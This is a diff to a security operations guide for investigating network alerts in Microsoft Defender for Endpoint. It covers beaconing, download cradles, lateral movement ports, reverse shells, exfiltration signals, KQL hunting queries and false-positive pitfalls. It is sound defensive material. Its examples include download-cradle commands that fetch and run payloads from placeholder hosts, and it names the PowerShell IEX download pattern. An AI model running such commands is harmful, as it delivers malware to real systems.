@@ -8,6 +8,16 @@ What to do, in order, is in the [playbook](playbook.md). This page explains what
 
 T0 = the first suspicious network event from the device, or the earliest malicious event before it, in UTC. It is not the alert time. Advanced Hunting holds 30 days of native data; older activity needs Sentinel retention.
 
+| What you see | Read |
+|--------------|------|
+| Repeated connections to one external destination, often on a timer | [C2 beaconing signals](#c2-beaconing-signals), then the [C2 beaconing investigation](../08-c2-beaconing/investigation.md) |
+| A downloader or script host fetching from the internet | [Download cradles](#download-cradles) |
+| DNS names with long, changing labels under one domain | [DNS beaconing](#dns-beaconing) |
+| A script host or unknown program reaching a cloud, paste or webhook service | [LOTS](#lots--living-off-trusted-sites), then the [LOTS & cloud C2 investigation](../09-lots-cloud-c2/investigation.md) |
+| One device connecting to other internal devices on admin ports | [Lateral movement — network signals](#lateral-movement--network-signals) |
+| Outbound connections on an unusual port, or from `cmd.exe` or `powershell.exe` | [Unusual ports and reverse shells](#unusual-ports-and-reverse-shells) |
+| Possible data theft | [Data leaving the device](#data-leaving-the-device) |
+
 ---
 
 ## What MDE can and can't show you
@@ -52,7 +62,14 @@ bitsadmin.exe /transfer job1 http://malicious.com/p.exe C:\Temp\p.exe
 mshta.exe http://185.x.x.x/payload.hta
 ```
 
-Suspicious destinations: raw IPs, paste sites, newly registered domains
+Also `curl.exe` ("Every installation of Microsoft Windows 10 and Windows 11 has curl installed by default"), PowerShell `Invoke-WebRequest` and `Start-BitsTransfer`, and `finger`. ATT&CK T1105 names `copy`, `finger`, `certutil` and the PowerShell `IEX(New-Object Net.WebClient).downloadString()` and `Invoke-WebRequest` patterns among Windows download methods.
+
+- **Read the command line first.** It holds the full URL (even for HTTPS) and the output path. A PowerShell `-EncodedCommand` (`-e`, `-ec`) is Base64 of UTF-16LE text: decode it as text, never run it ([decode before you judge](../02-suspicious-process/investigation.md#decode-before-you-judge)).
+- **Find the network event.** `certutil.exe`, PowerShell, `curl.exe` and `mshta.exe` make the connection themselves: look for network events with the same `InitiatingProcessId` and `InitiatingProcessCreationTime`. BITS transfers are run by the BITS service, which runs inside `svchost.exe` (ATT&CK T1197 describes BITS notify commands launched "from svchost.exe -k netsvcs -s BITS"). Expect the network event for a `bitsadmin.exe` or `Start-BitsTransfer` download to name `svchost.exe` (VERIFY (tenant)); match it on the host and time from the command line. A signed `svchost.exe` in `System32` doesn't clear a BITS download.
+- **Find what it wrote and whether it ran.** In `DeviceFileEvents`, look for files written by the downloader (same `InitiatingProcessId` and `InitiatingProcessCreationTime`) and files whose `FileOriginUrl` contains the host. Record the path and SHA1 of each. Run the hash sweep in the [malware alert investigation](../01-malware-alert/investigation.md#step-4--check-for-spread) and read `Tables`. A downloader often exits within seconds, so "not running" isn't "not executed".
+- **Was it blocked?** Check the alert's detection status and ASR events ([was it blocked?](../02-suspicious-process/investigation.md#was-it-blocked)) and the network protection events in the table above. A block doesn't clear the device: the downloader still ran.
+- **Don't touch the URL.** Don't browse to it, download from it or submit it to a public URL scanner ([LOTS Step 3](../09-lots-cloud-c2/investigation.md#step-3--recover-the-full-url)). Record it as an IOC.
+- Suspicious destinations: raw IPs, paste sites, newly registered domains. A familiar or cloud destination doesn't clear a download: see [LOTS](#lots--living-off-trusted-sites).
 
 ---
 
@@ -84,16 +101,65 @@ Classify the connecting process with the four client classes in [LOTS Step 1](..
 
 ## Lateral movement — network signals
 
-| Pattern | Meaning |
-|---------|---------|
-| Many connections to internal IPs on port 445 | SMB scanning |
-| Connections to port 3389 on multiple internal IPs | RDP lateral movement |
-| Connections to port 5985/5986 | WinRM / PowerShell remoting |
-| Connections to port 135/139 | WMI or legacy SMB |
+A connection to an internal host shows that the device tried to reach it. It doesn't show a logon or remote execution: confirm those on the target.
+
+| Port | Used by | Many internal targets from one device can mean |
+|------|---------|-----------------------------------------------|
+| 445 | SMB | SMB scanning, share enumeration, PsExec-style remote services, or SMB-based C2 |
+| 139 | NetBIOS session (older SMB) | As for 445, on older systems |
+| 135 | RPC endpoint mapper | WMI and other RPC-based remote management |
+| 3389 | RDP | RDP scanning or movement |
+| 5985 / 5986 | WinRM over HTTP / HTTPS (default ports since WinRM 2.0; listeners can use any port) | PowerShell remoting |
+| 22 | SSH | SSH scanning or movement |
+
+Normal sources of these connections: file servers, domain controllers, print servers, management and deployment tools, and approved vulnerability scanners. A workstation reaching internal hosts beyond its usual file servers, print servers and domain controllers needs an explanation. There is no safe count threshold.
+
+**Scanning or movement?**
+- **Scanning:** one device, many internal targets, a short time, mostly failed connections. The [lateral movement query](#internal-lateral-movement-scanning) has no `ActionType` filter, so it counts every event type together. In your copy, add `ActionType` to the `by` line to see successes and failures separately.
+- **Movement:** a logon or remote execution on a target. For each target that accepted a connection, check its logons (`DeviceLogonEvents`) and remote execution (PsExec services, `WmiPrvSE.exe` children, `wsmprovhost.exe`) with [remote execution tools](../06-credential-compromise/investigation.md#remote-execution-tools) in the credential compromise investigation.
+- **Scanning tools:** ATT&CK T1046 records Advanced IP Scanner and Advanced Port Scanner used to "enumerate network devices" in intrusions. Search `DeviceProcessEvents` on the device for scanner tools. An approved scanner is benign only when the customer confirms its source device and the scan window.
+- **Which process?** Outbound SMB may be attributed to `System` rather than to the program that asked for it (VERIFY (tenant)). Find the program in the Device timeline around the same time.
+- **Window.** The query covers T0 − 1h to T0 + 1h. Widen both `between` values in your copy if the activity lasted longer. Remove the device filter to find other devices doing the same.
+- **Investigation package.** `Arp.txt` (the ARP cache, which can show other hosts the device talked to) and the SMB sessions files (inbound and outbound SMB sessions) help identify targets.
+
+**Internal C2.** Cobalt Strike's SMB Beacon "uses named pipes to communicate through a parent Beacon", "also works across the network", and the host running it "must accept connections on port 445". Its TCP Beacon listens on a port (default 4444). Device-to-device C2 therefore looks like the connections above: repeated connections between the same two internal devices, or a process listening on an unusual port (Live Response `connections`). Check the target as well; each device in a chain runs a beacon. The C2 beaconing queries drop private destinations, so they don't see it.
+
+---
+
+## Unusual ports and reverse shells
+
+- **Reverse shell:** `cmd.exe` or `powershell.exe` itself making an outbound connection. This is a playbook escalation trigger.
+- **The ports in the [unusual outbound ports](#unusual-outbound-ports) query are leads, not proof.** The labels in its comments are the query author's. Two were checked against Fortra's Cobalt Strike documentation: 4444 is the TCP Beacon's default listen port. 50050 is labelled as the team server port, which is the operator's management port (Fortra: "Do not expose the management port directly to the public internet"), not where a Beacon checks in. The port number itself wasn't on the pages checked.
+- **The query hides processes by file name only** (`chrome.exe`, `msedge.exe`, `firefox.exe`, `teams.exe`, `slack.exe`, `zoom.exe`). Malware with one of those names, or code injected into a browser, is hidden. Programs with other names aren't excluded at all. Check the folder and signer of any excluded process you rely on.
+- Management software can use fixed non-standard ports. That is benign only for a named, sanctioned product (playbook, Closing as a false positive).
+
+---
+
+## Data leaving the device
+
+MDE records no byte counts, so it can't show a "large outbound transfer". Volume needs the customer's proxy or firewall logs. What you can see:
+- Upload and sync tools in command lines (`DeviceProcessEvents`), for example `rclone` or `MEGAsync`, started by an unexpected process or account.
+- Files collected and compressed shortly before the connections (archives written in `DeviceFileEvents`).
+- A scripting engine or unknown program (LOTS client class C or D) connecting to a webhook service, the Telegram Bot API, Microsoft Graph or a storage host outside the customer's tenant. Treat that as possible exfiltration, whatever the volume ([LOTS Step 7](../09-lots-cloud-c2/investigation.md#step-7--work-out-what-was-sent)).
+- Connection counts show how often a process connected, not how much it sent.
+
+---
+
+## Scope
+
+Spread is a reason to scope wider, never evidence that the traffic is benign.
+
+- **Other devices talking to the destination.** Search the IP or domain in the Defender portal. IP page: "IP prevalence in the organization" (how many devices, first and last seen; default 30 days) and "IP activity observed in the organization" (up to 100 devices). URL/domain page: the Devices tab (first and last event per device; default 30 days, up to six months). The [high connection count](#high-connection-count) query also runs estate-wide, but only shows pairs above 30 connections.
+- **The same process or downloaded file on other devices.** Run the hash sweep in the [malware alert investigation](../01-malware-alert/investigation.md#step-4--check-for-spread) with each SHA1. Zero rows doesn't prove no spread.
+- **After a block.** A device in `ExploitGuardNetworkProtectionBlocked` events for the destination is still trying to reach it: it is in scope.
+- **Internal targets.** Every internal host that accepted a connection from the device is in scope until checked ([lateral movement](#lateral-movement--network-signals)).
+- **First contact.** Rerun the query that hit with `T0 - 24h` changed to `T0 - 30d` on its `between` line in your copy (the 30-day Advanced Hunting limit). The earliest row for the same process SHA1 or destination on this device is the T0 candidate. The URL/domain page's Devices tab goes back further.
 
 ---
 
 ## KQL queries
+
+Every window is anchored to T0 (replace `PASTE_TIME_UTC`). These queries filter and threshold: zero rows doesn't clear a device.
 
 ### All external connections from a device
 ```kql
@@ -112,6 +178,8 @@ DeviceNetworkEvents
     InitiatingProcessFileName
 | order by Timestamp asc
 ```
+
+It returns the process file name only. For the folder path, SHA1, command line and account the playbook asks for, use the Device timeline, or add `InitiatingProcessFolderPath`, `InitiatingProcessSHA1`, `InitiatingProcessCommandLine` and `InitiatingProcessAccountName` to the `project` line in your copy. `RemoteIPType != "Private"` keeps every other type (Public, Reserved, Loopback and others), not only public addresses.
 
 ### High connection count
 ```kql
@@ -143,6 +211,8 @@ DeviceNetworkEvents
 | order by ConnectionCount desc
 ```
 
+Limits are in the [C2 beaconing investigation](../08-c2-beaconing/investigation.md#high-connection-count): C2 spread over several IPs splits the count, a slow beacon stays under 30, and `Processes` lists file names only. The comment's "non-CDN destination" is not a reason to skip a row: a CDN destination doesn't clear a connection (ATT&CK T1090.004, domain fronting, routes C2 through CDNs).
+
 ### Internal lateral movement scanning
 ```kql
 // Internal lateral movement — network scanning detection
@@ -167,6 +237,8 @@ DeviceNetworkEvents
     by RemotePort, InitiatingProcessFileName
 | order by TargetCount desc
 ```
+
+Limits: no `ActionType` filter, a two-hour window, file names only, and `TargetIPs` lists at most 10 addresses. See [lateral movement](#lateral-movement--network-signals) for how to read it.
 
 ### Unusual outbound ports
 ```kql
@@ -209,3 +281,18 @@ DeviceNetworkEvents
     InitiatingProcessFileName, InitiatingProcessCommandLine
 | order by Timestamp desc
 ```
+
+Limits: see [unusual ports and reverse shells](#unusual-ports-and-reverse-shells). It looks at non-private destinations only, so an internal TCP Beacon on 4444 isn't in it.
+
+---
+
+## False positives
+
+These tests don't separate benign software from C2, so don't close on them:
+- **A known app from a standard path.** Attackers install real remote-access tools. ATT&CK T1219: "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network." Beacons can also run inside signed programs.
+- **A long-established vendor domain or a CDN.** C2 can run over cloud services and through CDNs.
+- **The same pattern on many devices.** That can be spread. Scope it as a possible campaign.
+- **A signed `svchost.exe` behind a download.** BITS downloads run there.
+- **An internal scan from an address that looks like the scanner.** Confirm the scanner's source device and the scan window with the customer.
+
+To close as a false positive, every condition in Closing as a false positive in the [playbook](playbook.md) must hold.
